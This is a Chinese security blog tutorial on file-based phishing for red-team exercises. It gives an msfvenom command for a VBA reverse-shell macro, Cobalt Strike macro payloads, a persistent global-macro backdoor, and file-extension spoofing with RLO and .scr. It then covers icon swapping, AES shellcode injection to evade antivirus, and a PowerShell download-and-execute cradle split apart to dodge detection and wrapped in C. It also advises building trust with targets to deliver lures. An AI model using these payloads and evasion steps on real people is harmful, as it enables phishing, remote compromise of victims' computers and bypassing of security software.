##  前言

 **今年参加了几次攻防演练对抗赛，其它队伍依靠社工结合文件钓鱼得了不少分，自己之前并没有相关知识的积累，因此在这个方面吃了一些亏。**

##  office宏攻击

宏是微软公司为其OFFICE软件包设计的一个特殊功能，有着独特的文件后缀名，如：xlsm，docm，pptm等。

###  1、msf生成payload

    
    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip地址 LPORT=端口 -f vba -o nouyan.vba

-f指定生成vba宏语言的攻击payload

首先新建一个支持文件宏的office文件，以.docm进行演示。

![](https://image.3001.net/images/20191108/1573201844_5dc527b45d2d1.png!small)

首先选择文件-选项-自定义功能区-开发工具。

![](https://image.3001.net/images/20191108/1573201858_5dc527c2eaa9a.png!small)

![](https://image.3001.net/images/20191108/1573201873_5dc527d10c7b7.png!small)

点击宏按钮，创建一个新的文件宏。

![](https://image.3001.net/images/20191108/1573201886_5dc527dea6408.png!small)

把msf生成的宏代码复制到代码框中。

![](https://image.3001.net/images/20191108/1573201897_5dc527e9ee082.png!small)

保存文件，一个msf的反弹文件制作完成。

msf开启监听。

![](https://image.3001.net/images/20191108/1573201909_5dc527f503f68.png!small)

打开生成的1.docm文档。

![](https://image.3001.net/images/20191108/1573201922_5dc52802a343b.png!small)

出现安全警告，提升宏被禁用，点击启用内容。

成功上线。

![](https://image.3001.net/images/20191108/1573201933_5dc5280d6cf89.png!small)

###  2、cs生成payload

cs也支持生成office宏代码。

![](https://image.3001.net/images/20191108/1573201943_5dc5281744e0d.png!small)

选择一个监听器，直接复制代码到宏代码框中。

![](https://image.3001.net/images/20191108/1573201952_5dc52820a6085.png!small)

![](https://image.3001.net/images/20191108/1573201963_5dc5282b9e45a.png!small)

上线成功。

![](https://image.3001.net/images/20191108/1573201973_5dc528353ce2f.png!small)

###  实战

类似office宏还有一些其它利用方式，如DOCX文档远程模板注入执行宏，还可以通过shellcode进行免杀处理。

在实战中，首先尽可能社工目标的各种信息，取得对方信任，根据钓鱼的目标，修改文档的名字，通过邮箱进行发送，如xx公司采购说明。

office宏钓鱼存在几大不适用性：

1、对方电脑未使用office。

2、office默认禁用宏，打开文件会进行提示。

3、独特的宏文件后缀，docm，xlsm等，容易引起他人怀疑。

4、免杀性要求较高。

**全局宏建立持久性后门**

office宏除了用于钓鱼，还可以用来建立隐蔽的持久性后门。

新建一个宏，位置要选择所有活动模版和文档。

![](https://image.3001.net/images/20191108/1573201987_5dc52843ba929.png!small)

在ThisDocument中写入宏代码，进行保存。

![](https://image.3001.net/images/20191108/1573202003_5dc52853482b1.png!small)

成功建立了一个隐藏持久性后门，打开任意文档都可以触发宏代码，且杀软没有任何反应。

![](https://image.3001.net/images/20191108/1573202016_5dc528601245d.png!small)

![](https://image.3001.net/images/20191108/1573202025_5dc5286954990.png!small)

##  可执行exe文件

msf和cs都可以生成反弹木马，通过鼠标点击的方式进行触发。exe木马用于钓鱼，主要解决的问题有三个：

1 、后缀名隐藏

2、文件图标更换

3、文件免杀

###  后缀名隐藏

> [https://null-byte.wonderhowto.com/how-to/hide-virus-inside-fake-> picture-0168183/](https://links.jianshu.com/go?to=https%3A%2F%2Fnull-> byte.wonderhowto.com%2Fhow-to%2Fhide-virus-inside-fake-picture-0168183%2F)

**经典的“ .jpg.exe”**

默认情况下，Windows隐藏已知的文件扩展名。

![](https://image.3001.net/images/20191108/1573202050_5dc5288215863.png!small)

![](https://image.3001.net/images/20191108/1573202059_5dc5288b37783.png!small)

**使用.scr扩展名**

scr等同于exe后缀名。

![](https://image.3001.net/images/20191108/1573202067_5dc52893c4ccf.png!small)

**Unitrix反转后缀**

更改文件名为：重要资料xgpj.scr

![](https://image.3001.net/images/20191108/1573202077_5dc5289d57ba0.png!small)

光标移动到g之前选择RLO反转。

![](https://image.3001.net/images/20191108/1573202085_5dc528a5ed5dc.png!small)

成功隐藏后缀。

![](https://image.3001.net/images/20191108/1573202094_5dc528aede4ae.png!small)

经过测试，使用.scr扩展名和Unitrix反转后缀会被360直接报毒。

###  文件图标更换

使用Restorator对exe文件进行图标更改。

把木马文件和想要替换的目标exe都拖入到软件中。

![](https://image.3001.net/images/20191108/1573202106_5dc528ba2d3c0.png!small)

拖拽360图标到aaa.exe中，保存文件，成功替换图标。

![](https://image.3001.net/images/20191108/1573202114_5dc528c2f3a5f.png!small)

###  文件免杀

介绍两种免杀姿势。

**‘A’’V‘lator免杀**

>
> [下载传送门](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FCh0pin%2F**Iator%2Ftree%2Fmaster%2FCompiled%2520Binaries)

一个后门生成器实用程序，它使用加密和注入技术来绕过杀软检测，并且自带了RTLO和更改图标功能。

使用AES加密来加密给定的shellcode

生成包含加密有效负载的可执行文件

使用各种注入技术将shellcode解密并注入目标系统

![](https://image.3001.net/images/20191108/1573202128_5dc528d010345.png!small)

共有三个表单：

分别存放用于加密shellcode的加密密钥的文本，AES加密的IV的文本和shellcode的文本。

程序左方给出了在msf框架下的利用步骤。

本次使用cs进行演示。

1、生成c#的payload

![](https://image.3001.net/images/20191108/1573202137_5dc528d92539e.png!small)

2、保留16进制，使用notepad++去除空格

![](https://image.3001.net/images/20191108/1573202146_5dc528e2c86ab.png!small)

3、复制到payload框中进行加密

![](https://image.3001.net/images/20191108/1573202155_5dc528eb9249a.png!small)

4、可以选择反转后缀（会被某些杀毒识别为恶意软件），替换图标，选择注入技术，成功生成文件。

可以绕过大多数的杀软。

![](https://image.3001.net/images/20191108/1573202171_5dc528fb13698.png!small)

本机完美绕过360动静态查杀。

![](https://image.3001.net/images/20191108/1573202179_5dc52903a4004.png!small)

**powershell免杀**

当前各大杀软对powershell的免杀能力都不强。

免杀思路：首先找到免杀的powershell payload，通过其它语言系统命令执行函数，调用powershell，最后打包成exe。

使用cs自动生成的payload。

![](https://image.3001.net/images/20191108/1573202190_5dc5290ed1d51.png!small)

    
    
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://x.x.x.x/'))"

接下来的目的是对执行的powershell语句进行免杀处理。  

[https://04z.net/archives/bf627292.html](https://links.jianshu.com/go?to=https%3A%2F%2F04z.net%2Farchives%2Fbf627292.html)文章里面的一些免杀思路都不错。

很多思路和webshell的免杀相同，绕过关键字检测，需要自己动手去尝试，下面介绍一种powershell免杀。

##  关键字拆分免杀

拆分前：

    
    
    powershell.exe "IEX ((new-object net.webclient).downloadstring('http://x.x.x.x/'))"

经过测试杀软检测downloadstring字符串，进行拆分。

拆分后：

    
    
    powershell.exe "$a1='IEX ((new-object net.webclient).downl';$a2='oadstring(''http://x.x.x.x''))';$a3="$a1,$a2";IEX(-join $a3)"

成功绕过杀软。

![](https://image.3001.net/images/20191108/1573202213_5dc5292505df1.png!small)

对于对其它关键字的检测，都可以通过这种方法绕过。

使用c语言的system函数去执行powershell。

    
    
    #include<stdio.h>
    #include<stdlib.h>
    int main(){
    system("powershell.exe \"$a1='IEX ((new-object net.webclient).downl';$a2='oadstring(''http://x.x.x.x''))';$a3=\"$a1,$a2\";IEX(-join $a3)\"");
    return 0;
    }

编译成exe文件，180kb大小。

![](https://image.3001.net/images/20191108/1573202242_5dc52942e7af4.png!small)

大部分的杀软都不会报毒。

![](https://image.3001.net/images/20191108/1573202253_5dc5294dd75da.png!small)

运行后成功上线，会留下一个黑窗口。

![](https://image.3001.net/images/20191108/1573202262_5dc52956efc61.png!small)

可以使用 -w hidden进行隐藏执行，但hidden会报毒，可以尝试下拆分hidden进行绕过。

powershell能做的事情很多，比如免杀提权，更多的用法自行尝试。

##  总结

> 不管是宏文件还是钓鱼木马，一次成功的文件钓鱼离不开社会工程学，如何快速取得他人信任，才是难上之难。
>
> 未解决的问题：
>
> 绕过杀软隐藏真实文件后缀。

 ***本文原创作者：诺言，本文属于FreeBuf原创奖励计划，未尽许可禁止转载**

  

  

